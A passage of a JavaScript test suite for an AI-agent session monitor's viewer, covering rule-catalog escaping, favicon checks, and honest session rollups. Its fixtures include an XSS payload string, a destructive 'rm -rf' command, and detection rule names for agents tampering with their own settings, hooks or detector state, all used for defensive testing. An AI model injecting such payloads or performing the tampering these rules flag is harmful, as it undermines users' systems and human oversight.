  var meta  = { source:"/fixture", sha:"0".repeat(40), release:"fixture", rules:1 };
  var block = gen.renderBlock(meta, rules);

  ok("a hostile rule cannot close the script element", block.indexOf("</script") === -1);
  ok("a hostile rule cannot open an HTML comment", block.indexOf("<!--") === -1);
  eq("the emitted block passes the generator's own round-trip check",
     gen.verifyRoundTrip(block, meta, rules), null);

  // and it still evaluates to the original text
  var got = new Function('"use strict";' + block.replace(gen.BEGIN, "") .replace(gen.END, "") +
                         "\nreturn RULECAT;")();
  eq("the hostile description survives escaping intact",
     got["evil.injection"].d, r.description);
})();

(function(){
  var r = gen.parseRuleYAML([
    'id: chain.example', 'version: "2.0"', 'title: Chained', 'description: |-',
    '  first line', '  second line', 'severity: medium', 'sequence:',
    '  within_events: 64', '  steps:', '    - expr: |-', '        whatever'
  ].join("\n"));
  eq("a block scalar folds to one line", r.description, "first line second line");
  ok("a top-level sequence key is detected",
     Object.prototype.hasOwnProperty.call(r, "sequence"));
  eq("nested keys under sequence are not hoisted", r.within_events, undefined);
  eq("a quoted version keeps its value", r.version, "2.0");
})();

// A description that spells one of this file's own markers would sit inertly
// in the emitted JSON on run 1, then splice the block on run 2 and leave stray
// tokens in the viewer's only <script>. Escaping `*` makes the marker
// unspellable; the marker-count check is the backstop.
(function(){
  var evil = "text containing " + gen.END + " inside it";
  var rules = { "evil.marker": { v:"1.0", sev:"high", kind:"expr", t:"T", d:evil, g:[] } };
  var meta  = { source:"/fixture", sha:"0".repeat(40), release:"fixture", rules:1 };
  var block = gen.renderBlock(meta, rules);

  eq("a rule description cannot spell the end marker",
     block.indexOf(gen.END), block.lastIndexOf(gen.END));
  eq("a rule description cannot spell the begin marker",
     block.indexOf(gen.BEGIN), block.lastIndexOf(gen.BEGIN));
  eq("the marker-bearing rule still passes the round-trip check",
     gen.verifyRoundTrip(block, meta, rules), null);

  var got = new Function('"use strict";' + block.replace(gen.BEGIN, "").replace(gen.END, "") +
                         "\nreturn RULECAT;")();
  eq("the marker text survives escaping intact", got["evil.marker"].d, evil);

  // and splicing the emitted block back out must be unambiguous
  var host = "PRE" + block + "POST";
  var a = host.indexOf(gen.BEGIN), b = host.indexOf(gen.END);
  eq("re-splicing the block recovers exactly the host prefix", host.slice(0, a), "PRE");
  eq("re-splicing the block recovers exactly the host suffix",
     host.slice(b + gen.END.length), "POST");
})();

// renderBlock emits ids sorted; buildCatalog inserts them in file-walk order.
// A whole-object compare would call that ordering difference an escaping fault.
(function(){
  var rules = { "zeta.rule":  { v:"1", sev:"high", kind:"expr", t:"Z", d:"z", g:[] },
                "alpha.rule": { v:"1", sev:"low",  kind:"expr", t:"A", d:"a", g:[] } };
  var meta  = { source:"/fixture", sha:"0".repeat(40), release:"fixture", rules:2 };
  eq("round-trip verification is insensitive to key order",
     gen.verifyRoundTrip(gen.renderBlock(meta, rules), meta, rules), null);
})();

// `rules["__proto__"] = x` on a plain object sets the prototype instead of
// adding a key: the rule vanishes while every count still agrees.
(function(){
  var y = ['id: __proto__', 'version: "1.0"', 'title: T', 'description: |-',
           '  d', 'severity: high'].join("\n");
  eq("a __proto__ rule id parses as an ordinary id", gen.parseRuleYAML(y).id, "__proto__");
  ok("__proto__ is on the generator's unsafe list", gen.UNSAFE_IDS.indexOf("__proto__") !== -1);
  ok("constructor is on the generator's unsafe list", gen.UNSAFE_IDS.indexOf("constructor") !== -1);
})();

// The parser must refuse shapes it cannot read rather than silently guessing.
(function(){
  function problems(y){ return gen.parseRuleYAML(y)._problems; }
  ok("an inline comment is refused, not folded into the value",
     problems('id: a\nseverity: high # tuned later\n').length > 0);
  ok("a wrapped inline list is refused, not stored as a fragment",
     problems('id: a\ntags: [one,\n  two]\n').length > 0);
  ok("a quoted item in an inline list is refused, not split on its comma",
     problems('id: a\ntags: ["a, b", c]\n').length > 0);
  ok("an escaped quote is refused rather than kept raw",
     problems('id: a\ntitle: "a \\"q\\" w"\n').length > 0);
  // block sequences are the common YAML list form and are now read, not lost
  eq("a block-style list is parsed rather than dropped",
     JSON.stringify(gen.parseRuleYAML('id: a\ntags:\n  - exfil\n  - network\n').tags),
     '["exfil","network"]');
  eq("a clean rule reports no problems",
     problems('id: a\nversion: "1"\ntitle: T\nseverity: high\ntags: [x]\n').length, 0);
})();

/* multi-line commands keep their shape, and truncation stays codepoint-safe */

(function(){
  var script = "cd /tmp\ngit add -A\ngit commit -F - <<'MSG'\nsubject line\nMSG";
  var ip = interpret(findingFor(EXPR_ID, { observed_command:script }), RULECAT);
  ok("a multi-line command keeps its line breaks",
     ip.sawHere.text.indexOf("\n") !== -1, JSON.stringify(ip.sawHere.text));
  ok("the heredoc body does not run into the command",
     ip.sawHere.text.indexOf("<<'MSG' subject") === -1, ip.sawHere.text);
  ok("runs of spaces are still collapsed",
     interpret(findingFor(EXPR_ID, { observed_command:"a     b" }), RULECAT).sawHere.text === "a b");
})();

(function(){
  // must exceed the 320-unit sawHere budget, and land the cut mid-pair
  var e = "😀".repeat(400);
  var ip = interpret(findingFor(EXPR_ID, { observed_command:e }), RULECAT);
  var t = ip.sawHere.text;
  var last = t.charCodeAt(t.length - 2);
  ok("truncation never leaves a lone high surrogate",
     !(last >= 0xD800 && last <= 0xDBFF), JSON.stringify(t.slice(-4)));
  ok("the emoji command is still truncated", t.slice(-1) === "…");
})();

/* ── invariants the viewer depends on ───────────────────────────────────── */

// Two icon declarations, because neither covers both delivery modes. The
// inline SVG is the only one that works over file://, where there is no server
// to fetch from; Safari ignores SVG favicons supplied as data: URIs, so it
// needs the real PNG that numbatd serves at /favicon.ico.
ok("the viewer inlines an SVG icon for file:// use",
   /<link rel="icon" href="data:image\/svg\+xml,/.test(HTML));
ok("the viewer also points at the PNG numbatd serves",
   /<link rel="icon" type="image\/png"[^>]*href="\/favicon\.ico">/.test(HTML),
   "Safari will not use the data: URI icon");
ok("the SVG icon is inlined rather than referencing a sibling file",
   HTML.indexOf('rel="icon" href="viewer/favicon.svg"') === -1 &&
   HTML.indexOf('rel="icon" href="favicon.svg"') === -1);

// The PNG the daemon serves must actually be a PNG, or /favicon.ico 404s and
// Safari silently falls back to its generated placeholder.
(function(){
  var p = path.join(__dirname, "..", "viewer", "favicon.png"), buf;
  try { buf = fs.readFileSync(p); }
  catch(e){ failures.push("viewer/favicon.png is missing — numbatd's /favicon.ico would 404"); return; }
  eq("favicon.png has a PNG signature", buf.slice(0, 8).toString("latin1"), "\x89PNG\r\n\x1a\n");
  // Check the length before reading the IHDR, or a truncated file throws
  // ERR_OUT_OF_RANGE and takes every later assertion down with it.
  if(buf.length < 24){
    failures.push("favicon.png is too short to contain an IHDR (" + buf.length + " bytes)");
    return;
  }
  eq("favicon.png is 32 wide",  buf.readUInt32BE(16), 32);
  eq("favicon.png is 32 high",  buf.readUInt32BE(20), 32);
  ok("favicon.png is small enough to be inconsequential", buf.length < 4096, buf.length + " bytes");
})();

// Literal control bytes make `file` classify this source as binary, which makes
// grep skip it silently — a search that finds nothing then looks identical to a
// search that refused to look. Build such fixtures with String.fromCharCode.
(function(){
  var src = fs.readFileSync(__filename, "utf8"), bad = 0;
  for(var i = 0; i < src.length; i++){
    var c = src.charCodeAt(i);
    if((c < 32 && c !== 10 && c !== 13 && c !== 9) || c === 127) bad++;
  }
  eq("this test file contains no literal control characters", bad, 0);
})();

ok("the virtual-scroll row height is unchanged", /var ROW = 29\b/.test(HTML),
   "ROW must stay 29 — the list geometry is computed from it");
ok("esc() remains the single escape point in the interpretation render path",
   /function ipRender\(/.test(HTML) && HTML.indexOf("ipRender") !== -1);
ok("the interpretation block does not reference RULECAT directly",
   blockSrc("interpret").indexOf("RULECAT") === -1,
   "interpret() must take its catalog as an argument to stay independently testable");

/* ── rollup() ───────────────────────────────────────────────────────────────
   A session rollup states what a session did. The discipline it is held to
   here is that it must never imply success: no assertion below expects a
   pass/fail verdict, and several assert that an honest caveat is present.
   Fixtures are built inline by ev()/finding() so each case names only the
   fields it actually depends on. */

var T0 = "2026-07-31T10:00:00.000000Z";
function at(sec){
  var d = new Date(Date.parse(T0) + sec * 1000);
  return d.toISOString().replace("Z", "000Z"); // numbat writes microseconds
}
function ev(type, extra){
  var o = { record_type:"event", event_type:type, session_id:"s1",
            source_agent:"claude-code", source_type:"hook",
            endpoint:{ hostname:"test-host", os:"darwin" }, timestamp:at(0) };
  for(var k in extra) if(Object.prototype.hasOwnProperty.call(extra, k)) o[k] = extra[k];
  return o;
}
function noteMatching(r, re){
  for(var i = 0; i < r.notes.length; i++) if(re.test(r.notes[i])) return r.notes[i];
  return null;
}

/* — a normal session: start, prompt, paired commands, clean end — */
(function(){
  var recs = [
    ev("session.start", { timestamp:at(0), model:"claude-opus-5", actor:"system" }),
    ev("prompt.user",   { timestamp:at(1), content_preview:"fix the auth bug" }),
    ev("command.exec",  { timestamp:at(2), tool_call_id:"c1", command:"npm test" }),
    ev("command.result",{ timestamp:at(3), tool_call_id:"c1", duration_ms:1200 }),
    ev("file.read",     { timestamp:at(4), file_path:"/a/auth.js" }),
    ev("file.read",     { timestamp:at(5), file_path:"/a/auth.js" }),
    ev("file.write",    { timestamp:at(6), file_path:"/a/auth.js" }),
    ev("session.end",   { timestamp:at(9), actor:"system" })
  ];
  var r = rollup(recs, "s1");

  eq("rollup/normal reports the session id", r.id, "s1");
  eq("rollup/normal counts every record", r.records, 8);
  eq("rollup/normal reports the lifecycle as ended", r.lifecycle.state, "ended");
  eq("rollup/normal spans first to last timestamp (ms)", r.span.ms, 9000);
  eq("rollup/normal counts commands proposed", r.volume.execs, 1);
  eq("rollup/normal counts results observed", r.volume.results, 1);
  eq("rollup/normal leaves nothing unpaired", r.volume.unpaired, 0);
  eq("rollup/normal deduplicates files read by path", r.volume.uniqueReads, 1);
  eq("rollup/normal keeps the raw read count alongside the deduplicated one", r.volume.reads, 2);
  eq("rollup/normal carries the originating prompt", r.prompt, "fix the auth bug");
  eq("rollup/normal names the model from session.start", r.model, "claude-opus-5");
  eq("rollup/normal names the host", r.hosts[0].name, "test-host");
  eq("rollup/normal reports no device id when the endpoint omits one", r.deviceId, null);

  // The caveats necessarily talk about success in order to deny it, so a bare
  // keyword ban would fail on the honest text. Require instead that every
  // mention of an outcome is negated somewhere in the same sentence.
  (function(){
    var unqualified = r.notes.filter(function(n){
      if(!/succe|fail|passed/i.test(n)) return false;
      return !/cannot|could not|not\b|never|no\b/i.test(n);
    });
    ok("rollup/normal never asserts an outcome without negating it",
       unqualified.length === 0,
       "these notes mention an outcome unqualified: " + JSON.stringify(unqualified));
  })();
  ok("rollup/normal states that no exit code is present",
     !!noteMatching(r, /no record in this session carries an exit code/i));
})();

/* — zero findings is a signal, and must be stated as a number, not a blank — */
(function(){
  var r = rollup([ ev("session.start"), ev("session.end") ], "s1");
  eq("rollup/zero findings reports a count of zero rather than nothing", r.findings.total, 0);
  ok("rollup/zero findings returns an empty severity list, not null",
     Array.isArray(r.findings.bySeverity) && r.findings.bySeverity.length === 0);
  ok("rollup/zero findings returns an empty rule list, not null",
     Array.isArray(r.findings.rules) && r.findings.rules.length === 0);
})();

/* — findings are counted by severity and rule id — */
(function(){
  function finding(sev, rule){
    return { record_type:"finding", session_id:"s1", severity:sev, rule_id:rule,
             detected_at:at(2), source_agent:"claude-code" };
  }
  var r = rollup([
    ev("session.start"),
    finding("high",   "tamper.detector_state_write"),
    finding("high",   "tamper.detector_state_write"),
    finding("medium", "integrity.git_hooks_bypass")
  ], "s1");
  eq("rollup/findings totals them", r.findings.total, 3);
  eq("rollup/findings ranks severities by count", r.findings.bySeverity[0].name, "high");
  eq("rollup/findings counts the ranked severity", r.findings.bySeverity[0].count, 2);
  eq("rollup/findings collects distinct rule ids", r.findings.rules.length, 2);
  eq("rollup/findings reads detected_at when timestamp is absent", r.span.undated, 0);
})();

/* — a rule keeps its title, severity and target: a summary that shows only the
     rule id is less informative than the list of records it summarises — */
(function(){
  var r = rollup([
    { record_type:"finding", session_id:"s1", severity:"high", detected_at:at(1),
      rule_id:"tamper.agent_config_write", title:"Agent hook or settings file targeted",
      observed_file_path:"/Users/x/.claude/settings.json" },
    { record_type:"finding", session_id:"s1", severity:"high", detected_at:at(2),
      rule_id:"tamper.agent_config_write", title:"Agent hook or settings file targeted" }
  ], "s1");
  eq("rollup/finding detail keeps the rule id", r.findings.rules[0].name, "tamper.agent_config_write");
  eq("rollup/finding detail keeps the human title", r.findings.rules[0].title,
     "Agent hook or settings file targeted");
  eq("rollup/finding detail keeps the per-rule severity", r.findings.rules[0].sev, "high");
  eq("rollup/finding detail keeps what the finding pointed at",
     r.findings.rules[0].target, "/Users/x/.claude/settings.json");
  eq("rollup/finding detail counts repeats of the same rule", r.findings.rules[0].count, 2);
})();

/* — the paths themselves, not just how many: the written path is often the
     same thing a finding fired on — */
(function(){
  var r = rollup([
    ev("file.write", { file_path:"/a/one.js" }),
    ev("file.write", { file_path:"/a/one.js" }),
    ev("file.write", { file_path:"/a/two.js" }),
    ev("file.read",  { file_path:"/a/three.js" })
  ], "s1");
  eq("rollup/files ranks written paths by frequency", r.files.written[0].name, "/a/one.js");
  eq("rollup/files counts repeat writes to one path", r.files.written[0].count, 2);
  eq("rollup/files lists each distinct written path once", r.files.written.length, 2);
  eq("rollup/files lists read paths separately", r.files.read.length, 1);
  eq("rollup/files keeps the distinct count consistent with the list",
     r.volume.uniqueWrites, r.files.written.length);
  eq("rollup/files keeps the raw event count distinct from the path count",
     r.volume.writes, 3);
})();

/* — no session.end: the session was cut off, or is still running — */
(function(){
  var r = rollup([ ev("session.start"), ev("command.exec", { tool_call_id:"c1" }) ], "s1");
  eq("rollup/no end reports the lifecycle as open", r.lifecycle.state, "open");
  eq("rollup/no end counts one root start", r.lifecycle.rootStarts, 1);
  eq("rollup/no end counts no root end", r.lifecycle.rootEnds, 0);
  ok("rollup/no end says the session may still be running rather than that it failed",
     !!noteMatching(r, /may still be running, or it may have been cut off/i));
})();

/* — a session.end with no start: numbat was installed part-way through — */
(function(){
  var r = rollup([ ev("session.end") ], "s1");
  eq("rollup/end only reports the lifecycle as end-only", r.lifecycle.state, "end-only");
  ok("rollup/end only explains the missing start",
     !!noteMatching(r, /installed part-way through/i));
})();

/* — unpaired execs mean no result was recorded, not that anything failed — */
(function(){
  var r = rollup([
    ev("session.start"),
    ev("command.exec",  { tool_call_id:"c1", command:"a" }),
    ev("command.result",{ tool_call_id:"c1" }),
    ev("command.exec",  { tool_call_id:"c2", command:"b" }),
    ev("command.exec",  { tool_call_id:"c3", command:"c" })
  ], "s1");
  eq("rollup/unpaired counts three proposed commands", r.volume.execs, 3);
  eq("rollup/unpaired counts one observed result", r.volume.results, 1);
  eq("rollup/unpaired identifies two commands with no result", r.volume.unpaired, 2);

  var note = noteMatching(r, /no matching command\.result/i);
  ok("rollup/unpaired states plainly that no result was recorded", !!note);
  ok("rollup/unpaired explicitly denies the failure reading",
     !!note && /does not show that the command failed/i.test(note), note);
})();

/* — whether "still running" is available depends on the session's own state.
     An unpaired exec in a session with no recorded end may genuinely still be
     in flight; asserting otherwise contradicted the reference corpus, where one
     session's only unpaired exec is its final record. — */
(function(){
  var open = rollup([
    ev("session.start"),
    ev("command.exec", { tool_call_id:"c1", command:"sleep 600" })
  ], "s1");
  var note = noteMatching(open, /no matching command\.result/i);
  eq("rollup/unpaired open session is still open", open.lifecycle.state, "open");
  ok("rollup/unpaired in an unterminated session allows that it may still be running",
     !!note && /may still be running/i.test(note), note);
})();

(function(){
  var done = rollup([
    ev("session.start"),
    ev("command.exec", { tool_call_id:"c1", command:"sleep 600" }),
    ev("session.end")
  ], "s1");
  var note = noteMatching(done, /no matching command\.result/i);
  eq("rollup/unpaired ended session is ended", done.lifecycle.state, "ended");
  ok("rollup/unpaired in an ended session does not offer the still-running reading",
     !!note && !/may still be running/i.test(note), note);
  ok("rollup/unpaired in an ended session says the file does not record the outcome",
     !!note && /does not record how it ended/i.test(note), note);
})();

/* — exit-code coverage is stated even when some records carry one, so a single
     code cannot imply the rest were accounted for — */
(function(){
  var r = rollup([
    ev("command.result", { tool_call_id:"c1", exit_code:0 }),
    ev("command.result", { tool_call_id:"c2" }),
    ev("command.result", { tool_call_id:"c3" })
  ], "s1");
  eq("rollup/partial exit codes counts the covered results", r.outcome.withExitCode, 1);
  var note = noteMatching(r, /exit codes are present on/i);
  ok("rollup/partial exit codes states the coverage rather than going silent", !!note, JSON.stringify(r.notes));
  ok("rollup/partial exit codes names how many are undetermined",
     !!note && /2/.test(note) && /cannot be determined/i.test(note), note);
})();

/* — a result whose exec is missing is a gap in the file, reported separately — */
(function(){
  var r = rollup([ ev("command.result", { tool_call_id:"ghost" }) ], "s1");
  eq("rollup/orphan result counts it", r.volume.orphanResults, 1);
  eq("rollup/orphan result does not count it as unpaired", r.volume.unpaired, 0);
})();

/* — a single-event session must still produce a complete rollup — */
(function(){
  var r = rollup([ ev("prompt.user", { content_preview:"hello" }) ], "s1");
  ok("rollup/single event returns an object", !!r && typeof r === "object");
  eq("rollup/single event counts one record", r.records, 1);
  eq("rollup/single event has no lifecycle boundary recorded", r.lifecycle.state, "unrecorded");
  eq("rollup/single event still reports the prompt", r.prompt, "hello");
  // One dated record is an instant, not an unknown: the span is genuinely zero
  // and must stay distinguishable from the undated case, which is null.
  eq("rollup/single event reports a zero-length span, not an unknown one", r.span.ms, 0);
  ok("rollup/single event puts the span start and end at the same instant",
     r.span.from !== null && r.span.from === r.span.to);
  ok("rollup/single event says the boundaries are missing",
     !!noteMatching(r, /without either boundary/i));
})();

/* — no timestamps anywhere: the span is unknown, and says so — */
(function(){
  var a = ev("session.start"), b = ev("command.exec", { tool_call_id:"c1" });
  delete a.timestamp; delete b.timestamp;
  var r = rollup([ a, b ], "s1");
  eq("rollup/undated reports a null span start", r.span.from, null);
  eq("rollup/undated reports a null span end", r.span.to, null);
  eq("rollup/undated reports a null duration rather than zero", r.span.ms, null);
  eq("rollup/undated counts the undated records", r.span.undated, 2);
  ok("rollup/undated says they are excluded from the span",
     !!noteMatching(r, /no usable timestamp/i));
})();

/* — an unparseable timestamp counts as undated, not as epoch zero — */
(function(){
  var r = rollup([ ev("session.start", { timestamp:"not-a-date" }) ], "s1");
  eq("rollup/bad timestamp is treated as undated", r.span.undated, 1);
  eq("rollup/bad timestamp does not become a span", r.span.ms, null);
})();

/* — the originating prompt is the earliest by time, not by file order — */
(function(){
  var r = rollup([
    ev("prompt.user", { timestamp:at(50), content_preview:"second" }),
    ev("prompt.user", { timestamp:at(10), content_preview:"first" })
  ], "s1");
  eq("rollup/prompt picks the earliest by timestamp regardless of file order",
     r.prompt, "first");
  eq("rollup/prompt counts every prompt", r.volume.prompts, 2);
})();

/* — subagents share the parent session_id; boundaries and records differ — */
(function(){
  var r = rollup([
    ev("session.start"),
    ev("session.start", { sub_agent:"general-purpose" }),
    ev("session.end",   { sub_agent:"general-purpose" }),
    ev("command.exec",  { sub_agent:"general-purpose", tool_call_id:"c1" }),
    ev("command.result",{ sub_agent:"general-purpose", tool_call_id:"c1" })
  ], "s1");

  eq("rollup/subagent does not count a subagent start as a root start", r.lifecycle.rootStarts, 1);
  eq("rollup/subagent does not count a subagent end as a root end", r.lifecycle.rootEnds, 0);
  eq("rollup/subagent counts subagent starts separately", r.lifecycle.subStarts, 1);
  eq("rollup/subagent counts subagent ends separately", r.lifecycle.subEnds, 1);
  eq("rollup/subagent still reports the session as open on root boundaries",
     r.lifecycle.state, "open");
  eq("rollup/subagent names the agent type", r.subAgents[0].name, "general-purpose");
  eq("rollup/subagent counts every record it produced, not just boundaries",
     r.subAgentRecords, 4);
  ok("rollup/subagent explains that subagent work lands inside the parent session",
     !!noteMatching(r, /rather than as a session of its own/i));
})();

/* — unbalanced subagent boundaries cannot be paired, and the rollup says so — */
(function(){
  var r = rollup([
    ev("session.start"),
    ev("session.end", { sub_agent:"general-purpose" }),
    ev("session.end", { sub_agent:"a91d0c93e481afa65" })
  ], "s1");
  ok("rollup/subagent imbalance refuses to pair spans",
     !!noteMatching(r, /subagent spans cannot be paired/i));
})();

/* — repeated root boundaries are counted, never collapsed to a flag — */
(function(){
  var r = rollup([
    ev("session.start"), ev("session.end"),
    ev("session.start"), ev("session.end")
  ], "s1");
  eq("rollup/repeat counts both root starts", r.lifecycle.rootStarts, 2);
  eq("rollup/repeat counts both root ends", r.lifecycle.rootEnds, 2);
  ok("rollup/repeat offers resumption as the likely reading",
     !!noteMatching(r, /resumed session rather than several runs/i));
})();

/* — tool_error is the one honest failure signal, and it is not invertible — */
(function(){
  var r = rollup([
    ev("command.exec",  { tool_call_id:"c1" }),
    ev("command.result",{ tool_call_id:"c1", tags:["tool_error"] }),
    ev("command.exec",  { tool_call_id:"c2" }),
    ev("command.result",{ tool_call_id:"c2" })
  ], "s1");
  eq("rollup/tool_error counts tagged results", r.outcome.errored, 1);
  var note = noteMatching(r, /tool_error/i);
  ok("rollup/tool_error reports the tag", !!note);
  ok("rollup/tool_error refuses to invert absence into success",
     !!note && /not evidence that they succeeded/i.test(note), note);
})();

/* — exit_code is optional in numbat's schema; when present it is used — */
(function(){
  var r = rollup([
    ev("command.result", { tool_call_id:"c1", exit_code:0 }),
    ev("command.result", { tool_call_id:"c2", exit_code:1 })
  ], "s1");
  eq("rollup/exit_code counts records carrying one", r.outcome.withExitCode, 2);
  eq("rollup/exit_code counts the non-zero ones", r.outcome.nonZeroExit, 1);
  ok("rollup/exit_code drops the no-exit-code caveat when codes are present",
     !noteMatching(r, /no record in this session carries an exit code/i));
})();

(function(){
  // exit_code 0 must be distinguishable from an absent field — numbat types it
  // as a pointer for exactly this reason.
  var r = rollup([ ev("command.result", { tool_call_id:"c1", exit_code:0 }) ], "s1");
  eq("rollup/exit_code zero counts as present", r.outcome.withExitCode, 1);
  eq("rollup/exit_code zero is not counted as non-zero", r.outcome.nonZeroExit, 0);
})();

/* — enforcement decisions are reported by value, not filtered to deny — */
(function(){
  function enf(d){ return { record_type:"enforcement", session_id:"s1", decision:d, timestamp:at(1) }; }
  var r = rollup([ enf("no_override"), enf("no_override"), enf("deny") ], "s1");
  eq("rollup/enforcement totals decisions", r.enforcement.total, 3);
  eq("rollup/enforcement ranks the most common decision first", r.enforcement.decisions[0].name, "no_override");
  eq("rollup/enforcement keeps rarer decisions rather than dropping them",
     r.enforcement.decisions.length, 2);
})();

/* — artifact-sourced records carry a weaker claim about session.end — */
(function(){
  var r = rollup([ ev("session.start", { source_type:"artifact" }),
                   ev("session.end",   { source_type:"artifact" }) ], "s1");
  ok("rollup/artifact warns that a reconstructed end is an end-of-file marker",
     !!noteMatching(r, /end-of-file marker, not evidence the session ended/i));
})();

/* — purity and robustness: never throws, never reaches for a global — */
(function(){
  ok("rollup/robust returns an object for an empty array", !!rollup([], "s1"));
  eq("rollup/robust reports zero records for an empty array", rollup([], "s1").records, 0);
  ok("rollup/robust survives a non-array", !!rollup(null, "s1"));
  ok("rollup/robust survives an undefined session id", !!rollup([ev("session.start")], undefined));
  eq("rollup/robust coerces a missing session id to an empty string",
     rollup([ev("session.start")], undefined).id, "");
  ok("rollup/robust skips null entries rather than throwing",
     rollup([null, ev("session.start"), 42, "x", []], "s1").records === 1);
  ok("rollup/robust survives records whose fields are objects",
     !!rollup([{ record_type:"event", event_type:{}, file_path:{}, tags:{}, timestamp:[] }], "s1"));
  ok("rollup/robust survives a record with a null endpoint",
     !!rollup([{ record_type:"event", event_type:"file.read", endpoint:null }], "s1"));
})();

/* — the rollup returns data, never markup: esc() stays the single escape point — */
(function(){
  var xss = '<img src=x onerror=alert(1)>';
  var r = rollup([ ev("prompt.user", { content_preview:xss }) ], "s1");
  eq("rollup/xss returns the prompt verbatim, unescaped and unmangled", r.prompt, xss);
  ok("rollup/xss does not pre-escape, leaving escaping to the render layer",
     r.prompt.indexOf("&lt;") === -1 && r.prompt.indexOf("&amp;") === -1);
})();

/* — long values are truncated so one record cannot dominate the pane — */
(function(){
  var long = new Array(600).join("x");
  var r = rollup([ ev("prompt.user", { content_preview:long }) ], "s1");
  ok("rollup/truncation bounds the originating prompt", r.prompt.length <= 240,
     "prompt length was " + r.prompt.length);
  ok("rollup/truncation marks the cut with an ellipsis", /…$/.test(r.prompt));
})();

(function(){
  // Truncating between a surrogate pair renders U+FFFD. Build the fixture from
  // code units so the source file stays plain ASCII.
  var pair = String.fromCharCode(0xD83D, 0xDE80); // U+1F680
  var long = new Array(200).join(pair);
  var r = rollup([ ev("prompt.user", { content_preview:long }) ], "s1");
  ok("rollup/truncation never splits a surrogate pair",
     r.prompt.indexOf(String.fromCharCode(0xFFFD)) === -1);
  var lastReal = r.prompt.replace(/…$/, "");
  ok("rollup/truncation leaves no dangling high surrogate",
     !(lastReal.charCodeAt(lastReal.length - 1) >= 0xD800 &&
       lastReal.charCodeAt(lastReal.length - 1) <= 0xDBFF));
})();

/* — describe() must not assert an outcome the record cannot establish. This is
     the sentence rendered on every row, so it is the one that most needs to
     agree with interpret() and rollup(), both of which say "proposed". — */
(function(){
  var d = describe({ record_type:"event", event_type:"command.exec",
                     source_type:"hook", command:"rm -rf /tmp/x" });
  ok("describe() does not claim a command.exec ran", !/\bRan\b/.test(d), d);
  ok("describe() says a command.exec was proposed", /^Proposed a shell command/.test(d), d);

  // A finished command with no exit code must still not read as success.
  var r = describe({ record_type:"event", event_type:"command.result", duration_ms:1900 });
  ok("describe() does not claim success without an exit code",
     !/success|succeed/i.test(r), r);
  eq("describe() reports the duration it does have", r, "Command finished after 1.9 s");

  // Durations cascade past the hour rather than reading "267 min".
  eq("describe() renders a multi-hour duration readably",
     describe({ record_type:"event", event_type:"command.result", duration_ms:16020000 }),
     "Command finished after 4 h 27 min");
  eq("describe() keeps the seconds a sub-hour duration carries",
     describe({ record_type:"event", event_type:"command.result", duration_ms:150000 }),
     "Command finished after 2 min 30 s");
  eq("describe() omits a zero seconds component",
     describe({ record_type:"event", event_type:"command.result", duration_ms:120000 }),
     "Command finished after 2 min");
})();

/* — one duration format, three implementations ─────────────────────────────
   dsDur, exDur and rvSpan live in three different scopes: two inside marked
   pure blocks that may not share a helper across a boundary, one in the render
   code. The duplication is forced. What is NOT forced is disagreement — the
   rollup used to render 4h 27m beside describe()'s 4 h 27 min for the same
   span, and rvSpan dropped the decimal on short durations while dsDur kept it.
   These must agree exactly, so the same number never reads two ways. */
(function(){
  function lift(name, block){
    var src = block ? blockSrc(block) : HTML;
    var m = src.match(new RegExp("function\\s+" + name + "\\s*\\(ms\\)\\{[\\s\\S]*?\\n  \\}"));
    if(!m) bail("could not lift " + name + "() for the duration-agreement test");
    return new Function("return " + m[0] + "; " + name + ";")();
  }
  var dsDur  = lift("dsDur",  "describe");
  var exDur  = lift("exDur",  "explain");
  var rvSpan = lift("rvSpan", null);

  var CASES = [
    [0,         "0 ms"],
    [43,        "43 ms"],
    [999,       "999 ms"],
    [1000,      "1.0 s"],
    [1500,      "1.5 s"],
    [1900,      "1.9 s"],
    [9999,      "10.0 s"],
    [10000,     "10 s"],
    [43000,     "43 s"],
    // 59.999 s must not render as "60 s"; it rolls to the next unit.
    [59999,     "1 min"],
    [60000,     "1 min"],
    [90000,     "1 min 30 s"],
    [120000,    "2 min"],
    [150000,    "2 min 30 s"],
    [600000,    "10 min"],
    [3599000,   "59 min 59 s"],
    [3600000,   "1 h 0 min"],
    [16020000,  "4 h 27 min"]
  ];
  CASES.forEach(function(c){
    eq("dsDur("  + c[0] + ")", dsDur(c[0]),  c[1]);
    eq("exDur("  + c[0] + ")", exDur(c[0]),  c[1]);
    eq("rvSpan(" + c[0] + ")", rvSpan(c[0]), c[1]);
  });

  // rvSpan is the only one that takes untrusted input directly; it must still
  // refuse a non-number rather than rendering "NaN ms".
  eq("rvSpan rejects a non-number", rvSpan("nope"), "");
  eq("rvSpan rejects NaN", rvSpan(NaN), "");
  eq("rvSpan rejects Infinity", rvSpan(Infinity), "");
})();

/* — record-derived map keys are unbounded in the record; bound them at entry so
     one hostile field cannot inflate the pane — */
(function(){
  var huge = new Array(4000).join("x");
  var r = rollup([ ev("file.read", { source_agent:huge, file_path:"/a" }) ], "s1");
  ok("rollup() bounds an unbounded agent name", r.agents[0].name.length <= 120,
     "length was " + r.agents[0].name.length);
  ok("rollup() bounds an unbounded rule id",
     rollup([{ record_type:"finding", session_id:"s1", rule_id:huge, severity:"high" }], "s1")
       .findings.rules[0].name.length <= 120);
})();

/* — the header total must reconcile with the grid, not silently exceed it — */
(function(){
  var r = rollup([
    ev("session.start"),
    ev("command.exec", { tool_call_id:"c1" }),
    ev("permission.requested", { decision:"asked" }),
    ev("network.indicator", { url:"https://x" })
  ], "s1");
  eq("rollup/other counts records no grid cell covers", r.volume.other, 2);
  var accounted = r.volume.execs + r.volume.results + r.volume.toolCalls + r.volume.toolResults +
                  r.volume.reads + r.volume.writes + r.volume.prompts + r.volume.assistantMessages +
                  r.volume.other + r.findings.total + r.enforcement.total +
                  r.lifecycle.rootStarts + r.lifecycle.rootEnds +
                  r.lifecycle.subStarts + r.lifecycle.subEnds;
  eq("rollup/other makes the parts sum to the whole", accounted, r.records);
})();

/* — the three pure blocks each carry their own copy of these helpers so they
     stay independently extractable. Copies are fine; divergence is not, so
     assert they agree on the cases that actually differed. — */
(function(){
  var pair = String.fromCharCode(0xD83D, 0xDE80); // U+1F680
  var s = "ab" + pair + "cd";
  var d = describe({ record_type:"event", event_type:"command.exec", command:new Array(400).join(pair) });
  ok("describe() never emits a lone surrogate half",
     d.indexOf(String.fromCharCode(0xFFFD)) === -1 &&
     !(d.replace(/…$/,"").charCodeAt(d.replace(/…$/,"").length-1) >= 0xD800 &&
       d.replace(/…$/,"").charCodeAt(d.replace(/…$/,"").length-1) <= 0xDBFF),
     JSON.stringify(d.slice(-8)));

